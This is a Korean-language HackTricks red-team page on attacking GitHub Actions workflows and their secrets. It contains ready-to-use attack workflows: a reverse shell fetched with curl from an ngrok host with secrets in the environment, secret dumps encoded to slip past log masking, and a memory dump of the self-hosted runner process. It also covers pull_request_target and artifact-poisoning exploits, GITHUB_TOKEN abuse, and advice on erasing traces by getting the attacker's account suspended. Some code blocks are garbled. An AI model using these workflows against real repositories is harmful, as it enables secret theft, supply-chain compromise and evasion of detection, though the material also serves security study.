# Abusing Github Actions

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로부터 히어로까지 AWS 해킹 배우기**!</summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 PDF로 HackTricks 다운로드**하고 싶다면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 얻으세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬** [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## 기본 정보

이 페이지에서는 다음을 찾을 수 있습니다:

* **공격자가 Github Action에 액세스**하는 모든 영향의 요약
* **액션에 액세스하는 다양한 방법**:
* 액션을 생성할 **권한**이 있는 경우
* **풀 리퀘스트** 관련 트리거를 남용하는 경우
* **기타 외부 액세스** 기술을 남용하는 경우
* 이미 손상된 저장소에서 **피벗**하는 경우
* 마지막으로, 내부에서 액션을 남용하는 **포스트-익스플로잇레이션 기술**에 대한 섹션 (언급된 영향을 초래)

## 영향 요약

[**Github Actions에 대한 기본 정보를 확인하려면 여기를 클릭하세요**](../basic-github-information.md#github-actions).

**저장소**에서 **임의의 Github 액션을 실행하거나 코드를 삽입**할 수 있는 경우 다음을 수행할 수 있습니다:

* 해당 저장소/조직에서 **비밀**을 **도용**할 수 있음
* 삽입만 할 수 있는 경우, 워크플로에 이미 존재하는 것을 도용할 수 있음
* AWS 및 GCP와 같은 다른 플랫폼에 액세스하기 위해 **저장소 권한**을 남용할 수 있음
* 사용자 정의 워커에서 **코드 실행** (사용자 정의 워커를 사용하는 경우) 및 거기서 피벗을 시도할 수 있음
* 저장소 **코드를 덮어쓰기**할 수 있음
* 이는 `GITHUB_TOKEN`의 권한에 따라 다름
* **배포** 및 기타 **아티팩트**를 **손상**시킬 수 있음
* 코드가 배포하거나 저장하는 경우 해당 코드를 수정하여 추가 액세스를 얻을 수 있음

## GITHUB\_TOKEN

이 "**비밀**"(`${{ secrets.GITHUB_TOKEN }}` 및 `${{ github.token }}`에서 나옴)은 관리자가 이 옵션을 활성화할 때 제공됩니다:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

이 토큰은 **Github 애플리케이션이 사용할** 것이므로 동일한 엔드포인트에 액세스할 수 있습니다: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github는 GitHub 내에서 **크로스-저장소 액세스**를 허용하는 [**흐름**](https://github.com/github/roadmap/issues/74)을 출시해야 하므로 저장소가 `GITHUB_TOKEN`을 사용하여 다른 내부 저장소에 액세스할 수 있습니다.
{% endhint %}

이 토큰의 가능한 **권한**을 확인할 수 있습니다: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

이 토큰은 작업이 완료된 후 **만료**됩니다.\
이러한 토큰은 다음과 같습니다: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

이 토큰으로 할 수 있는 흥미로운 작업 몇 가지:

{% tabs %}
{% tab title="PR 병합" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="PR 승인" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="PR 생성" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
여러 번에 걸쳐 **Github Actions envs나 secrets 안에 github 사용자 토큰을 찾을 수 있는** 경우가 있습니다. 이러한 토큰은 리포지토리와 조직에 대해 더 많은 권한을 부여할 수 있습니다.
{% endhint %}

<details>

<summary>Github Action 출력에서 secrets 목록 표시</summary>

\`\`\`yaml name: list\_env on: workflow\_dispatch: # Launch manually pull\_request: #Run it when a PR is created to a branch branches: - '\*\*' push: # Run it when a push is made to a branch branches: - '\*\*' jobs: List\_env: runs-on: ubuntu-latest steps: - name: List Env # Need to base64 encode or github will change the secret value for "\*\*\*" run: sh -c 'env | grep "secret\_" | base64 -w0' env: secret\_myql\_pass: $\{{secrets.MYSQL\_PASSWORD\}} secret\_postgress\_pass: $\{{secrets.POSTGRESS\_PASSWORDyaml\}} \`\`\`

</details>

<details>

<summary>시크릿을 사용하여 리버스 쉘 획득</summary>

\`\`\`yaml name: revshell on: workflow\_dispatch: # Launch manually pull\_request: #Run it when a PR is created to a branch branches: - '\*\*' push: # Run it when a push is made to a branch branches: - '\*\*' jobs: create\_pull\_request: runs-on: ubuntu-latest steps: - name: Get Rev Shell run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh' env: secret\_myql\_pass: $\{{secrets.MYSQL\_PASSWORD\}} secret\_postgress\_pass: $\{{secrets.POSTGRESS\_PASSWORDyaml\}} \`\`\`

</details>

다른 사용자의 저장소에서 Github 토큰에 부여된 권한을 확인할 수 있습니다. **작업 로그를 확인**합니다:

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## 허용된 실행

{% hint style="info" %}
이는 Github 작업을 침해하는 가장 쉬운 방법일 수 있습니다. 이 경우에는 **조직 내에서 새 저장소를 생성할 수 있는 권한**이 있거나 **저장소에 쓰기 권한**이 있는 것으로 가정합니다.

이러한 시나리오에 있는 경우 [사후 침투 기술](./#post-exploitation-techniques-from-inside-an-action)을 확인할 수 있습니다.
{% endhint %}

### 저장소 생성에서 실행

조직 구성원이 **새 저장소를 생성**할 수 있고 Github 작업을 실행할 수 있는 경우, **새 저장소를 생성하고 조직 수준에서 설정된 비밀을 탈취**할 수 있습니다.

### 새 브랜치에서 실행

이미 Github 작업이 구성된 저장소에 **새 브랜치를 생성**할 수 있는 경우, 해당 작업을 **수정**하고 내용을 **업로드**한 다음 **새 브랜치에서 해당 작업을 실행**할 수 있습니다. 이렇게 하면 저장소 및 조직 수준의 비밀을 **유출**할 수 있습니다(그러나 해당 비밀의 이름을 알아야 합니다).

수정된 작업을 **수동으로** 실행하거나 **PR이 생성**될 때 또는 **코드가 푸시**될 때 실행할 수 있습니다(얼마나 시끄럽게 하고 싶은지에 따라):

```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```

***

## 포크된 실행

{% hint style="info" %}
공격자가 다른 저장소의 **Github Action을 실행**할 수 있게 하는 다양한 트리거가 있습니다. 이러한 트리거 가능한 작업이 잘못 구성되어 있다면, 공격자가 그것들을 침해할 수 있을 수도 있습니다.
{% endhint %}

### `pull_request`

워크플로 트리거 \*\*`pull_request`\*\*는 일반적으로 **첫 번째 협력**인 경우에는 **유지자**가 워크플로의 **실행을 승인**해야 하는 경우를 제외하고, 풀 리퀘스트가 수신될 때마다 워크플로를 실행합니다:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**기본 제한**이 **첫 번째** 기여자를 대상으로 하기 때문에, 유효한 버그/오타를 수정하고 새로운 `pull_request` 권한을 남용하기 위해 **다른 PR을 보낼 수 있습니다**.

**이를 테스트했지만 작동하지 않습니다**: ~~다른 옵션은 프로젝트에 기여한 사람의 이름으로 계정을 만들고 그 계정을 삭제하는 것일 수 있습니다.~~
{% endhint %}

또한, 기본적으로 **대상 저장소에 쓰기 권한** 및 **시크릿 액세스**를 방지하며 [**문서**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories)에서 언급된 대로 **`GITHUB_TOKEN`을 제외한 시크릿은 포크된 저장소에서 워크플로가 트리거될 때 러너로 전달되지 않습니다**. **`GITHUB_TOKEN`은 포크된 저장소의 풀 리퀘스트에서 읽기 전용 권한**을 갖습니다.

공격자는 Github Action의 정의를 수정하여 임의의 작업을 실행하고 임의의 작업을 추가할 수 있습니다. 그러나 언급된 제한 사항으로 인해 시크릿을 도용하거나 저장소를 덮어쓸 수는 없습니다.

{% hint style="danger" %}
**네, 공격자가 PR에서 트리거될 Github Action을 변경하면, 그의 Github Action이 사용되고 원본 저장소의 것이 아닙니다!**
{% endhint %}

공격자가 실행되는 코드를 제어하기 때문에 `GITHUB_TOKEN`에 시크릿이나 쓰기 권한이 없더라도 공격자는 예를 들어 **악성 아티팩트를 업로드**할 수 있습니다.

### **`pull_request_target`**

워크플로 트리거 \*\*`pull_request_target`\*\*는 대상 저장소에 **쓰기 권한**과 **시크릿 액세스**를 갖고 있으며 (권한을 요청하지 않음).

워크플로 트리거 \*\*`pull_request_target`\*\*는 **PR에서 실행되는 것이 아닌 기본 컨텍스트**에서 실행되며 (신뢰할 수 없는 코드를 실행하지 않음). `pull_request_target`에 대한 자세한 정보는 [**문서**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target)를 확인하십시오.\
또한, 이 특정 위험한 사용에 대한 자세한 정보는 [**github 블로그 게시물**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)을 확인하십시오.

**실행되는 워크플로**가 **PR이 아닌 기본**에서 정의된 것이기 때문에 \*\*`pull_request_target`\*\*를 사용하는 것이 **안전**해 보일 수 있지만, **그렇지 않은 경우도 있습니다**.

이 경우에는 **시크릿에 액세스**할 수 있습니다.

### `workflow_run`

[**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) 트리거는 `completed`, `requested`, 또는 `in_progress`일 때 다른 워크플로에서 워크플로를 실행할 수 있습니다.

이 예에서는 "Run Tests" 워크플로가 완료된 후에 워크플로를 실행하도록 구성되어 있습니다:

```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```

게다가 문서에 따르면: `workflow_run` 이벤트에 의해 시작된 워크플로우는 **이전 워크플로우가 아니더라도 비밀 정보에 액세스하고 토큰을 작성할 수 있습니다**.

이 유형의 워크플로우는 외부 사용자가 **`pull_request`** 또는 **`pull_request_target`를 통해 트리거할 수 있는 워크플로우에 의존하는 경우 공격을 받을 수 있습니다. 취약한 예시는** [**이 블로그에서 찾을 수 있습니다**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** 첫 번째 예시는 \*\*`workflow_run`\*\*을 트리거하는 워크플로우가 공격자의 코드를 다운로드하는 것입니다: `${{ github.event.pull_request.head.sha }}`\
두 번째 예시는 **신뢰할 수 없는** 코드에서 **아티팩트**를 **전달**하고 이 아티팩트의 내용을 사용하여 **RCE에 취약**하게 만드는 것입니다.

### `workflow_call`

TODO

TODO: pull\_request에서 실행될 때 사용/다운로드된 코드가 원본에서 오는지 포크된 PR에서 오는지 확인

## 포크된 실행 남용

외부 공격자가 깃허브 워크플로우를 실행할 수 있는 방법을 모두 언급했으니, 이 실행이 잘못 구성된 경우 어떻게 남용될 수 있는지 살펴보겠습니다:

### 신뢰할 수 없는 체크아웃 실행

\*\*`pull_request`\*\*의 경우, 워크플로우는 **PR의 컨텍스트에서 실행**됩니다(따라서 **악성 PR 코드가 실행**됩니다), 하지만 누군가가 **먼저 승인**해야 하며 일부 [제한](./#pull\_request)으로 실행됩니다.

\*\*`pull_request_target` 또는 `workflow_run`\*\*을 사용하는 워크플로우가 \*\*`pull_request_target` 또는 `pull_request`\*\*에서 트리거될 수 있는 워크플로우에 의존하는 경우 원본 리포지토리의 코드가 실행되므로 **공격자는 실행된 코드를 제어할 수 없습니다**.

{% hint style="danger" %}
그러나 **액션**에 **명시적 PR 체크아웃**이 있고 PR 코드를 가져오는 경우(베이스가 아닌), 공격자가 제어하는 코드가 사용됩니다. 예를 들어(12번째 줄에서 PR 코드가 다운로드되는 부분 확인):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># 보안 취약. 예시로만 제공됨.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

잠재적으로 **신뢰할 수 없는 코드가 `npm install` 또는 `npm build` 중에 실행**되며, 빌드 스크립트와 참조된 **패키지는 PR 작성자가 제어**합니다.

{% hint style="warning" %}
취약한 액션을 검색하기 위한 깃허브 도크는 다음과 같습니다: `event.pull_request pull_request_target extension:yml` 그러나 액션이 불안전하게 구성되어 있더라도 누가 PR을 생성하는지에 대한 조건부 사용(조건문 사용)과 같은 방법을 사용하여 안전하게 실행되도록 작업을 구성하는 다양한 방법이 있습니다.
{% endhint %}

### 컨텍스트 스크립트 삽입 <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

일부 [**깃허브 컨텍스트**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context)의 값은 **PR을 생성하는 사용자**에 의해 **제어**됩니다. 깃허브 액션이 이 **데이터를 실행하는 데 사용**하는 경우 **임의의 코드 실행**으로 이어질 수 있습니다:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV 스크립트 삽입** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

문서에 따르면: **`GITHUB_ENV`** 환경 파일에 환경 변수를 정의하거나 업데이트하여 워크플로우 작업의 **이후 단계에서 환경 변수를 사용할 수 있습니다**.

공격자가 이 **env** 변수에 **임의의 값**을 삽입할 수 있다면, **LD\_PRELOAD** 또는 **NODE\_OPTIONS**와 같은 환경 변수를 삽입하여 이후 단계에서 코드를 실행할 수 있습니다.

예를 들어 ([**여기**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) 및 [**여기**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), 업로드된 아티팩트를 신뢰하고 해당 내용을 **`GITHUB_ENV`** 환경 변수에 저장하는 워크플로우를 상상해보십시오. 공격자는 다음과 같은 내용을 업로드하여 해당 워크플로우를 침해할 수 있습니다:

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### 취약한 서드 파티 깃허브 액션

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

[**이 블로그 게시물**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks)에 언급된 바와 같이 이 깃허브 액션은 다른 워크플로우 및 리포지토리에서 아티팩트에 액세스할 수 있습니다.

문제는 **`path`** 매개변수가 설정되지 않은 경우, 아티팩트가 현재 디렉토리에 추출되어 나중에 사용되거나 심지어 워크플로우에서 실행될 수 있는 파일을 덮어쓸 수 있다는 것입니다. 따라서 아티팩트가 취약하면 공격자가 이를 남용하여 아티팩트를 신뢰하는 다른 워크플로우를 침해할 수 있습니다.

취약한 워크플로우의 예시:

```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```

다음 워크플로우로 이를 공격할 수 있습니다:

```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```

***

## 기타 외부 액세스

### 삭제된 네임스페이스 리포지토리 탈취

계정이 이름을 변경하면 일정 시간 후 다른 사용자가 해당 이름으로 계정을 등록할 수 있습니다. 만약 리포지토리가 **이름 변경 전에 100개 미만의 스타**를 가졌다면, Github는 동일한 이름을 가진 새로운 등록 사용자가 **삭제된 리포지토리와 동일한 이름의 리포지토리를 생성할 수 있도록** 합니다.

{% hint style="danger" %}
따라서 액션이 존재하지 않는 계정의 리포지토리를 사용하는 경우, 공격자가 해당 계정을 생성하고 액션을 침해할 수 있습니다.
{% endhint %}

만약 다른 리포지토리가 **이 사용자 리포지토리에서 종속성을 사용**하고 있다면, 공격자는 이를 탈취할 수 있습니다. 더 자세한 설명은 여기에서 확인할 수 있습니다: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## 리포지토리 피벗

{% hint style="info" %}
이 섹션에서는 **첫 번째 리포지토리에 액세스**가 있는 경우 **다른 리포지토리로 피벗**할 수 있는 기술에 대해 이야기하겠습니다(이전 섹션을 확인하세요).
{% endhint %}

### 캐시 독려

캐시는 **동일 브랜치에서의 워크플로우 실행 간에 유지**됩니다. 즉, 공격자가 **캐시에 저장된 패키지를 침해**하고 이를 **다운로드**하고 실행하는 **보다 권한이 높은** 워크플로우를 침해할 수 있습니다.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### 아티팩트 독려

워크플로우는 **다른 워크플로우 및 심지어 리포지토리에서 아티팩트를 사용**할 수 있습니다. 공격자가 **다른 워크플로우를 침해**할 수 있도록 **아티팩트를 업로드하는 Github 액션을 침해**한다면:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## 액션으로부터의 사후 침투

### OIDC를 통한 AWS 및 GCP 액세스

다음 페이지를 확인하세요:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### 비밀 액세스 <a href="#accessing-secrets" id="accessing-secrets"></a>

스크립트에 콘텐츠를 삽입하는 경우, 비밀을 어떻게 액세스할 수 있는지 알아보는 것이 흥미로울 것입니다:

* 비밀 또는 토큰이 **환경 변수**로 설정된 경우, \*\*`printenv`\*\*를 사용하여 환경을 통해 직접 액세스할 수 있습니다.

<details>

<summary>Github 액션 출력에서 비밀 목록 표시</summary>

\`\`\`yaml name: list\_env on: workflow\_dispatch: # Launch manually pull\_request: #Run it when a PR is created to a branch branches: - '\*\*' push: # Run it when a push is made to a branch branches: - '\*\*' jobs: List\_env: runs-on: ubuntu-latest steps: - name: List Env # Need to base64 encode or github will change the secret value for "\*\*\*" run: sh -c 'env | grep "secret\_" | base64 -w0' env: secret\_myql\_pass: $\{{secrets.MYSQL\_PASSWORD\}}

secret\_postgress\_pass: $\{{secrets.POSTGRESS\_PASSWORDyaml\}}

````
</details>

<details>

<summary>시크릿을 사용하여 역쉘 획득하기</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
````

</details>

* 시크릿이 **표현식 안에서 직접 사용**되면 생성된 셸 스크립트가 **디스크에 저장**되어 액세스할 수 있습니다.
* ```bash
  ```

cat /home/runner/work/\_temp/\*

````
* JavaScript 액션의 경우 시크릿은 환경 변수를 통해 전송됩니다.
* ```bash
ps axe | grep node
````

* **사용자 정의 액션**의 경우, 프로그램이 **인수로부터 얻은 시크릿을 사용하는 방식**에 따라 위험이 다를 수 있습니다:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Self-hosted 러너 남용

**Github Actions이 Github 인프라가 아닌 곳에서 실행되는지** 찾는 방법은 Github Action 구성 yaml에서 \*\*`runs-on: self-hosted`\*\*를 검색하는 것입니다.

**Self-hosted** 러너는 **추가로 민감한 정보에 액세스**할 수 있으며, 다른 **네트워크 시스템**(네트워크의 취약한 엔드포인트? 메타데이터 서비스?)에도 액세스할 수 있습니다. 심지어 격리되고 파괴되더라도 \*\*동시에 여러 작업이 실행될 수 있으며, 악의적인 작업이 다른 작업의 시크릿을 \*\*훔칠 수 있습니다.

Self-hosted 러너에서는 **\_Runner.Listener** 프로세스에서 시크릿을 얻을 수도 있으며, 이는 메모리를 덤프하여 언제든지 워크플로의 모든 시크릿을 포함할 것입니다:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

[**더 많은 정보는 여기를 확인하세요**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github 도커 이미지 레지스트리

Github 내부에 **도커 이미지를 빌드하고 저장하는 Github 액션**을 만들 수 있습니다.\
다음 확장 가능한 예시에서 찾을 수 있습니다:

<details>

<summary>Github 액션 빌드 및 도커 이미지 푸시</summary>

\`\`\`yaml \[...]

* name: Set up Docker Buildx uses: docker/setup-buildx-action@v1
* name: Login to GitHub Container Registry uses: docker/login-action@v1 with: registry: ghcr.io username: $\{{ github.repository\_owner \}} password: $\{{ secrets.ACTIONS\_TOKEN \}}
* name: Add Github Token to Dockerfile to be able to download code run: | sed -i -e 's/TOKEN=##VALUE##/TOKEN=$\{{ secrets.ACTIONS\_TOKEN \}}/g' Dockerfile
* name: Build and push uses: docker/build-push-action@v2 with: context: . push: true tags: | ghcr.io/$\{{ github.repository\_owner \}}/$\{{ github.event.repository.name \}}:latest ghcr.io/$\{{ github.repository\_owner \}}/$\{{ github.event.repository.name \}}:$\{{ env.GITHUB\_NEWXREF \}}-$\{{ github.sha \}}

\[...]

````
</details>

이전 코드에서 볼 수 있듯이, Github 레지스트리는 **`ghcr.io`**에 호스팅됩니다.

레포지토리에 읽기 권한이 있는 사용자는 개인 액세스 토큰을 사용하여 Docker 이미지를 다운로드할 수 있습니다:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
````

사용자는 **Docker 이미지 레이어에서 유출된 비밀 정보를 검색**할 수 있습니다:

#### Github Actions 로그에 민감한 정보

**Github**가 액션 로그에서 **비밀 값**을 감지하려고 시도하고 **표시하지 않도록** 하지만, 액션 실행 중에 생성된 **다른 민감한 데이터**는 숨겨지지 않을 수 있습니다. 예를 들어, 비밀 값으로 서명된 JWT는 [특별히 구성되지 않는 한](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) 숨겨지지 않습니다.

### 자신의 활동 숨기기

([**여기**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)의 기술) 먼저 제기된 PR은 기본적으로 Github와 대상 GitHub 계정에 모두 공개적으로 표시됩니다. Github에서는 **인터넷에서 PR을 삭제할 수 없지만**, 한 가지 꼼수가 있습니다. Github에 의해 **중단된** 계정의 경우, 모든 **PR이 자동으로 삭제**되고 인터넷에서 제거됩니다. 따라서 활동을 숨기려면 **GitHub 계정을 중단하거나 계정을 플래그 처리**해야 합니다. 이렇게 하면 GitHub에서 모든 활동이 인터넷에서 숨겨집니다 (기본적으로 모든 악용 PR을 제거함).

GitHub의 한 조직은 GitHub에 계정을 신고하는 데 매우 적극적입니다. 해야 할 일은 이슈에 "어떤 내용"을 공유하는 것뿐이며, 그들은 12시간 내에 귀하의 계정이 중단되도록 보장할 것입니다 :p 그리고 여기에, 귀하의 악용이 GitHub에서 보이지 않게 되었습니다.

조직이 대상이 되었음을 알아차리는 유일한 방법은 GitHub UI에서 PR이 제거되므로 SIEM에서 GitHub 로그를 확인하는 것입니다.

### 도구

다음 도구는 Github Action 워크플로우를 찾고 취약한 것을 식별하는 데 유용합니다:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

</details>
